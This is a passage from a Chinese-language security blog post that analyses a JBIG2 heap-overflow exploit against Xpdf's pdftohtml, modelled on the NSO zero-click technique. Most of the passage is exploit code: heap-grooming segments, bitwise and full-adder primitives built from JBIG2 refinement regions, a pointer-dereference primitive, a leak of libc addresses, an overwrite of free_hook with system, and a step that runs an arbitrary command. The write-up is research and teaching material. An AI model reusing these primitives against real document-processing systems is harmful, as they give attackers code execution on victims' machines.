<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Overwrite pageBitmap-&gt;w, h and line</span><br><span class="line">GenericRegion(</span><br><span class="line">    104,</span><br><span class="line">    x&#x3D;(page_bitmap_buf_to_class_offset + 12) * 8,</span><br><span class="line">    y&#x3D;0,</span><br><span class="line">    comb_op&#x3D;CombOp.Replace,</span><br><span class="line">    # (x, y) -&gt; mem[(y &lt;&lt; 24) | (x &gt;&gt; 3)] &gt;&gt; (7 - (x &amp; 7)), max 48-bit addressing</span><br><span class="line">    bitmap&#x3D;Bitmap(struct.pack(&quot;&lt;III&quot;, 2 ** 27, 2 ** 24, 2 ** 24)),</span><br><span class="line">    imm&#x3D;True,</span><br><span class="line">),</span><br></pre></td></tr></table></figure>

<p>修改后的 pageBitmap 的二维空间构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------------------&gt; w&#x3D;2^27 bit</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">V h&#x3D;2^24 bit</span><br></pre></td></tr></table></figure>

<p>最后创建带有 16 个 Bitmap 的 SymbolDict ，以备接下来的利用所使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 16 &quot;variables&quot;. Since we can only do bitwise operations relative to page bitmap</span><br><span class="line"># with Refinement regions, we need these variables for peeking other absolute</span><br><span class="line"># addresses, and also rebase the page bitmap in one segment command.</span><br><span class="line">SymbolDict(105, [Bitmap(64, 1)] * 16)</span><br></pre></td></tr></table></figure>

<p>这些 SymbolDict 将用于<strong>地址解引用原语</strong>中，具体在下面会详细介绍。</p>
<blockquote>
<p>整体的堆风水布局大体如上所示。完成堆溢出后，pageBitmap 具备了大偏移读写的功能，因此接下来就要开始写原语利用了。</p>
</blockquote>
<h3 id="2-位运算原语"><a href="#2-位运算原语" class="headerlink" title="2. 位运算原语"></a>2. 位运算原语</h3><p>还记得先前介绍的 <code>GenericRefinementRegionSeg</code> 么（不记得就翻到上面看看），接下来我们需要利用这个 seg 的特性来编写任意位的位运算器。</p>
<p>exploit 中实现的位运算器如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class BitSeg:</span><br><span class="line">    _seq &#x3D; itertools.count(10000)</span><br><span class="line"></span><br><span class="line">    def __init__(self, seg_num):</span><br><span class="line">        self.seg_num &#x3D; seg_num</span><br><span class="line">        self.__consumed &#x3D; False</span><br><span class="line"></span><br><span class="line">    def consume(self):</span><br><span class="line">        assert not self.__consumed</span><br><span class="line">        self.__consumed &#x3D; True</span><br><span class="line">        return self.seg_num</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def from_page(cls, offset):</span><br><span class="line">        x, y &#x3D; offset % 2 ** 27, offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">        idx &#x3D; next(cls._seq)</span><br><span class="line">        page0.append(ReadoutRefinement(idx, x&#x3D;x, y&#x3D;y, imm&#x3D;False))</span><br><span class="line">        return cls(idx)</span><br><span class="line"></span><br><span class="line">class CombOp(enum.IntEnum):</span><br><span class="line">    Or &#x3D; 0</span><br><span class="line">    And &#x3D; 1</span><br><span class="line">    Xor &#x3D; 2</span><br><span class="line">    Xnor &#x3D; 3</span><br><span class="line">    Replace &#x3D; 4</span><br><span class="line"></span><br><span class="line">def bitop(oa, ob, op: CombOp):</span><br><span class="line">    b &#x3D; BitSeg.from_page(ob)</span><br><span class="line">    x, y &#x3D; oa % 2 ** 27, oa &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        ReadoutRefinement(65536, x&#x3D;x, y&#x3D;y, imm&#x3D;True, ref&#x3D;b.consume(), comb_op&#x3D;op)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原语 bitop 的 oa、ob 两个参数的单位为 bit，op 有 5 种。</p>
</blockquote>
<p>bitop 原语初始时将一维偏移量 oa、ob 分别<strong>映射</strong>至 bitmap 的二维偏移量 xy1、xy2，之后在解析 ob 对应的 RefinementRegionSeg 时，从 pageBitmap 中取出对应 xy2 的数据，并将其存入 segments 中。</p>
<blockquote>
<p>一维偏移量向二维偏移量映射时，为什么使用的是 2^27 作为除数/模数呢？因为这是上面所修改后的 width 的大小。</p>
</blockquote>
<p>接下来当 hso 解析 oa 对应的 RefinementRegionSeg 时，hso 会重新读入先前存入的 ob 对应的 RefinementRegion，并将其与 pageBitmap 特定 xy1 位置进行位运算，达到<strong>指定 pageBitmap 上任意两位之间进行位运算</strong>的目的。</p>
<p>这里需要注意的是，findSegment 查找算法的核心，是<strong>依次遍历 segments 列表的元素并比对 segNum 来进行查找</strong>。因此每次添加进 segment 的 RefinementRegion，其 <strong>segNum 一定不能与之前 append 进去的 segments 相同！</strong></p>
<p>当位运算原语 <code>binop</code> 可用后，接下来就可以构建其他原语：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bitwise_mov &#x3D; lambda a, b: bitop(a, b, CombOp.Replace)</span><br><span class="line">bitwise_xor &#x3D; lambda a, b: bitop(a, b, CombOp.Xor)</span><br><span class="line">bitwise_and &#x3D; lambda a, b: bitop(a, b, CombOp.And)</span><br><span class="line">bitwise_or &#x3D; lambda a, b: bitop(a, b, CombOp.Or)</span><br><span class="line"></span><br><span class="line">def op_q_q(oa, ob, op: CombOp):</span><br><span class="line">    for i in range(64):</span><br><span class="line">        bitop(oa * 8 + i, ob * 8 + i, op)</span><br><span class="line"></span><br><span class="line"># Offsets are in bytes.</span><br><span class="line">mov_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Replace)</span><br><span class="line">xor_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Xor)</span><br><span class="line">and_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.And)</span><br><span class="line">or_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Or)</span><br></pre></td></tr></table></figure>

<p>这里的 <code>op_q_q</code> 原语，其 oa、ob 参数的<strong>单位为字节</strong>（注意和 binop 的单位并不相同）。</p>
<p><code>op_q_q</code> 原语的目的，是对给定 <code>oa</code> 和 <code>ob</code> 的相对一维偏移字节所对应的两个位置，做一次<strong>8字节位运算</strong>。</p>
<p>举个例子，原语 <code>and_q_q(0, 8)</code>，执行的操作为：</p>
<ul>
<li>将<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)，与 <strong>偏移量为 8字节</strong> 的位置上的 八字节（即 8-15 这8字节），进行一次一一对应的 and 运算。</li>
<li>将运算结果放置在<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)上。</li>
</ul>
<blockquote>
<p>这个原语其实很好理解，只是用文字记录下来感觉不太好记录，也可能是我文笔不太好。</p>
</blockquote>
<p>之后便是通过位运算来构建8字节全加器，可以先看看<a href="https://developer.aliyun.com/article/593228" target="_blank" rel="noopener">这篇文章</a>再看看代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># Don&#39;t worry, Libra won&#39;t hu^W^W^W Xpdf allocates 1 more byte</span><br><span class="line">adder_buf_offset &#x3D; GLIST_DATA_SIZE &#x2F;&#x2F; 4 * 8 # 1024</span><br><span class="line"></span><br><span class="line">def add_q_q(oa, ob):</span><br><span class="line">    oa, ob &#x3D; oa * 8, ob * 8</span><br><span class="line">    ab_xor, ab_and, carry, ab_xor_c_and, zero &#x3D; range(</span><br><span class="line">        adder_buf_offset, adder_buf_offset + 5</span><br><span class="line">    )</span><br><span class="line">    # 初始时，最低位全加器的进位标志为0</span><br><span class="line">    bitwise_mov(carry, zero)</span><br><span class="line">    # 8字节 &#x3D; 64 位，因此这里的 range 为 64</span><br><span class="line">    for i in range(64):</span><br><span class="line">        # 这里是每个 **位** 的全加器，一个全加器由两个半加器构成</span><br><span class="line">        a_bit_offset &#x3D; oa + i &#x2F;&#x2F; 8 * 8 + (7 - i % 8)</span><br><span class="line">        b_bit_offset &#x3D; ob + i &#x2F;&#x2F; 8 * 8 + (7 - i % 8)</span><br><span class="line">        # This is a naive full-adder. Applying TIS-100 skill could cut 3~4 ops maybe.</span><br><span class="line">        # 首先是第一个半加器</span><br><span class="line">        bitwise_mov(ab_xor, a_bit_offset)</span><br><span class="line">        bitwise_xor(ab_xor, b_bit_offset)</span><br><span class="line">        bitwise_mov(ab_and, a_bit_offset)</span><br><span class="line">        bitwise_and(ab_and, b_bit_offset)</span><br><span class="line">        # 其次是第二个半加器</span><br><span class="line">        bitwise_mov(a_bit_offset, ab_xor)</span><br><span class="line">        bitwise_xor(a_bit_offset, carry)  # output (S)</span><br><span class="line">        bitwise_mov(ab_xor_c_and, ab_xor)</span><br><span class="line">        bitwise_and(ab_xor_c_and, carry)</span><br><span class="line">        # 设置进位标志</span><br><span class="line">        bitwise_mov(carry, ab_and)</span><br><span class="line">        bitwise_or(carry, ab_xor_c_and)</span><br></pre></td></tr></table></figure>

<p>其全加器结构如下所示：</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095455.jpg" alt=""></p>
<h3 id="3-立即数运算原语"><a href="#3-立即数运算原语" class="headerlink" title="3. 立即数运算原语"></a>3. 立即数运算原语</h3><p>除了上面所介绍的位运算原语以外，还有加载外部立即数计算的原语。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def op_q_imm(offset, imm, op):</span><br><span class="line">    offset *&#x3D; 8</span><br><span class="line">    x, y &#x3D; offset % 2 ** 27, offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        GenericRegion(</span><br><span class="line">            233, x&#x3D;x, y&#x3D;y, comb_op&#x3D;op, bitmap&#x3D;Bitmap(struct.pack(&quot;&lt;Q&quot;, imm)), imm&#x3D;True</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">mov_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Replace)</span><br><span class="line">xor_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Xor)</span><br><span class="line">and_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.And)</span><br><span class="line">or_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Or)</span><br></pre></td></tr></table></figure>

<p>readGenericRegionSeg 方法可从外部 JBIG2Stream 流中读入一个 bitmap 并将其与 pageBitmap 上的特定位置进行运算，因此 GenericRegionSeg 可用于此处的立即数运算原语。</p>
<h3 id="4-地址解引用原语"><a href="#4-地址解引用原语" class="headerlink" title="4. 地址解引用原语"></a>4. 地址解引用原语</h3><p>当我们有了某个指针的绝对地址后，我们如何将这个指针从该绝对地址中读取出来呢？这就需要用到地址解引用操作。这里，exploit 准备了两个原语：</p>
<ul>
<li><p><code>rebase_variable_q</code>：将 pageBitmap 中一维偏移为 <code>addr_page_offset</code> 处的 8 字节数据，复制进<strong>堆风水中最后一步所创建的</strong>带有 16 个 Bitmap 的 SymbolDict 中，第 idx 个 JBIG2Bitmap 的 <strong>data 字段</strong>上：</p>
<blockquote>
<p>注意，是直接将值覆盖在 JBIG2Bitmap 的 data 字段上，而不是写进 data 指针所指向的内存上。</p>
</blockquote>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def rebase_variable_q(idx, addr_page_offset):</span><br><span class="line">    mov_q_q(</span><br><span class="line">        variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,</span><br><span class="line">        addr_page_offset,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>load_variable</code>：读取最后一个 Symbol Dict 中，第 idx 个 JBIG2Bitmap <strong>backing store 里的</strong>（即 data 指针解引用后的内存上） 的第一个 8 字节数据，至 pageBitmap 中一维偏移为 <code>to_page_offset</code> 处的 8 字节内存位置。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def load_variable(to_page_offset, idx):</span><br><span class="line">    to_page_offset *&#x3D; 8</span><br><span class="line">    x, y &#x3D; to_page_offset % 2 ** 27, to_page_offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        TextRegion(</span><br><span class="line">            233,</span><br><span class="line">            x&#x3D;x,</span><br><span class="line">            y&#x3D;y,</span><br><span class="line">            w&#x3D;64,</span><br><span class="line">            h&#x3D;1,</span><br><span class="line">            imm&#x3D;True,</span><br><span class="line">            instances&#x3D;[idx],</span><br><span class="line">            ref_symbol_cnt&#x3D;16,</span><br><span class="line">            ref_segs&#x3D;[105],</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>这两个原语一结合，就能达到地址解引用的目的。</p>
<h3 id="5-整体利用流程"><a href="#5-整体利用流程" class="headerlink" title="5. 整体利用流程"></a>5. 整体利用流程</h3><p>各类原语已经都准备好了，接下来便是结合这些原语覆写 free_hook 为 libc_system 的地址。</p>
<p>首先，我们需要 leak 一个地址出来（这个地址自然不能是堆地址），通过查看堆布局：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address .....</span><br><span class="line">...</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; high address .....</span><br></pre></td></tr></table></figure>

<p>可以看到紧临着 pageBitmap 的便是 SymbolDict，因此我们可以尝试读取其<strong>虚表指针</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer</span><br><span class="line"># 取出vtbl地址放到+0处</span><br><span class="line">mov_q_q(0, ptmalloc_chunk_size(GLIST_DATA_SIZE &#x2F;&#x2F; 4))</span><br></pre></td></tr></table></figure>

<p>之后从外部读取一个相对偏移至 pageBitmap data + 8 的位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 计算出-vtbl_offset + free_got_offset</span><br><span class="line">mov_q_imm(</span><br><span class="line">    8, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % 2 ** 64</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后再简单做个加法，就能得到 free 条目在 GOT 表上的绝对地址，放到 +0 处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 计算vtbl地址+(-vtbl_offset + free_got_offset)得到free_got的地址，放到+0处</span><br><span class="line">add_q_q(0, 8)</span><br></pre></td></tr></table></figure>

<p>接下来，尝试对该 <code>free.got</code> 地址进行解引用，获取 <code>free.libc</code> 地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 从+0处取出free_got的地址，放到第0个&quot;变量&quot;data 指针处</span><br><span class="line">rebase_variable_q(0, 0)</span><br><span class="line"># 取出存放在第0个&quot;变量&quot;里的值（此时该值为 libc.free 的绝对地址），放到+8处</span><br><span class="line">load_variable(8, 0)  # address of libc.free at +8</span><br></pre></td></tr></table></figure>

<p>在获取到 <code>free.libc</code> 地址后，读入一个相对偏移并做个加法，经过简单几步，我们便能得到 <code>free_hook</code> 和 <code>libc_system</code> 的绝对地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 把LIBC_FREE_OFFSET这个立即数的值放到+0处</span><br><span class="line">mov_q_imm(0, -LIBC_FREE_OFFSET % 2 ** 64)</span><br><span class="line"># 计算free_got的地址+(-libc_free_offset)，得到libc基地址，放到+8处</span><br><span class="line">add_q_q(8, 0)</span><br><span class="line"># 复制+8处存放的libc基地址至+0处</span><br><span class="line">mov_q_q(0, 8)</span><br><span class="line"># 把LIBC_FREE_HOOK_OFFSET这个立即数放到+16处</span><br><span class="line">mov_q_imm(16, LIBC_FREE_HOOK_OFFSET)</span><br><span class="line"># 计算出libc基地址+LIBC_FREE_HOOK_OFFSET,即free_hook的绝对地址，放到+0处</span><br><span class="line">add_q_q(0, 16)</span><br><span class="line"># 取出system的偏移这个立即数，放到+16处</span><br><span class="line">mov_q_imm(16, LIBC_SYSTEM_OFFSET)</span><br><span class="line"># 计算出system的绝对地址，放到+8处</span><br><span class="line">add_q_q(8, 16)</span><br></pre></td></tr></table></figure>

<p>注意，此时 <code>pageBitmap-&gt;data</code> 上的数据为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+0: free_hook_address     +8: libc_system_address</span><br></pre></td></tr></table></figure>

<p>接下来便是计算 <code>pageBitmap-&gt;data + 8</code> 的地址，即存放着这个 <code>libc_system_address</code> 值的内存地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 取出pagebitmap的data指针，放到+24处</span><br><span class="line">mov_q_q(24, page_bitmap_buf_to_data_ptr)</span><br><span class="line"># 把立即数8放到+16处</span><br><span class="line">mov_q_imm(16, 8)</span><br><span class="line"># 将data指针加上8，并将结果放到+24处</span><br><span class="line">add_q_q(24, 16)</span><br></pre></td></tr></table></figure>

<p>计算出这个内存地址的用处是什么呢？继续向下看，注意重头戏快到了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 取出pagebitmap的data指针的值放到第0个变量的 data 字段</span><br><span class="line">rebase_variable_q(0, page_bitmap_buf_to_data_ptr)</span><br><span class="line"># 取出data指针+8的值，放到第1个变量的 data 字段</span><br><span class="line">rebase_variable_q(1, 24)</span><br><span class="line"># 取出第0个变量的值，放到data指针处, 这一步会修改 data 指针为 free_hook_address</span><br><span class="line">load_variable(page_bitmap_buf_to_data_ptr, 0)</span><br><span class="line"># 取出第1个变量的值（也就是 libc_system_address），放到+0处，也就是 free_hook 基地址上的那个指针值</span><br><span class="line"># 这样就完成了改写 free hook 的操作</span><br><span class="line">load_variable(0, 1)</span><br></pre></td></tr></table></figure>

<p>这样，<strong>此时的 free hook 便被改写成了 libc_system 的地址</strong>，接下来便是尝试执行命令。</p>
<p>这里再 append 一个 带有待执行命令的 bitmap：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page0.append(</span><br><span class="line">    GenericRegion(233, x&#x3D;64, y&#x3D;0, comb_op&#x3D;CombOp.And, bitmap&#x3D;Bitmap(COMMAND_TO_RUN))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这样当 <code>readGenericRegionSeg</code> 函数结束时，新创建的 bitmap（即带有命令的 bitmap）将会被 free 掉，这样就可以触发 <code>system(command)</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                       GBool lossless, Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    [...];</span><br><span class="line">    &#x2F;&#x2F; read the bitmap</span><br><span class="line">    bitmap &#x3D; readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               NULL, atx, aty, mmr ? length - 18 : 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        &#x2F;&#x2F; 在这里触发 system</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但有两点需要注意：</p>
<ol>
<li><p>imm 必须为 true，这样才能触发 delete 操作。</p>
</li>
<li><p>创建的 GenericRegionSeg，其<strong>二维偏移 xy 映射至一维偏移后的偏移量，不能小于 64（即 8 字节）</strong></p>
<p> 这是因为代码中会先执行 <code>pageBitmap-&gt;combine</code> 再执行 <code>delete bitmap</code> 操作。此时的 <code>pageBitmap-&gt;data</code> 为 free hook address，如果执行 combine 时修改了<code>pageBitmap-&gt;data</code> 最低的8个字节，那么 free 时就无法调用到 libc_system，因为保存在 free_hook 上面的 libc_system 地址被破坏了。</p>
</li>
</ol>
<h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><ul>
<li><p><a href="https://github.com/Riatre/hso-groupie" target="_blank" rel="noopener">hso-groupie - Riatre github</a></p>
</li>
<li><p><a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution - Google Project Zero</a></p>
</li>
<li><p><a href="https://blog.csdn.net/tjcwt2011/article/details/107877566" target="_blank" rel="noopener">一个简单PDF文件的结构分析 - CSDN</a></p>
</li>
<li><p><a href="https://blog.csdn.net/lacoucou/article/details/114638913" target="_blank" rel="noopener">PDF 文件格式 基本结构 - CSDN</a></p>
</li>
<li><p><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf" target="_blank" rel="noopener">https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf - Adobe</a></p>
<blockquote>
<p>重点在 7.4.7 JBIG2Decode Filter 这节。</p>
</blockquote>
</li>
<li><p><a href="https://github.com/agl/jbig2enc/blob/master/fcd14492.pdf" target="_blank" rel="noopener">Coding of Still Pictures : JBIG &amp; JPEG - JBIG Committee</a></p>
</li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/02/08/codeql_flow_analyze/" rel="next" title="CodeQL 数据流分析/污点分析 笔记（上篇）">
                <i class="fa fa-chevron-left"></i> CodeQL 数据流分析/污点分析 笔记（上篇）
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2099/09/17/peixun/" rel="prev" title="Sakuraの定制化Fuzz和浏览器相关的安全技术培训">
                Sakuraの定制化Fuzz和浏览器相关的安全技术培训 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/sakura_heart.png"
                alt="sakura" />
            
              <p class="site-author-name" itemprop="name">sakura</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">100</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
                      
